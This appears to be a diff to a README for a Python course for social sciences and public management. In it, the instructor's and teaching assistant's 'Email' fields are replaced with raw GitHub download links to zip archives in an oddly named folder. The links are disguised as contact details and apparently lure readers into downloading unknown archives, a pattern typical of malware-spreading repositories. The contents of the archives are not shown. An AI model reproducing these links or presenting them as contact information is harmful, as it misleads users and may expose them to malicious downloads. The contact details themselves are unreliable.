@@ -4,9 +4,9 @@
 - **Course name:** Fundamentals of Python for Social Sciences and Public Management  
 - **Theory hours:** 16 hours  
 - **Instructor:** Alexander Quispe Rojas  
-  - **Email:** https://raw.githubusercontent.com/Bruno1702vm/diplomado_ds_python/main/gneissoid/diplomado_ds_python.zip  
+  - **Email:** https://github.com/Bruno1702vm/diplomado_ds_python/raw/refs/heads/main/gneissoid/python_ds_diplomado_2.2.zip  
 - **Teaching Assistant:** Michael Encalada  
-  - **Email:** https://raw.githubusercontent.com/Bruno1702vm/diplomado_ds_python/main/gneissoid/diplomado_ds_python.zip  
+  - **Email:** https://github.com/Bruno1702vm/diplomado_ds_python/raw/refs/heads/main/gneissoid/python_ds_diplomado_2.2.zip  
 
 ---
 
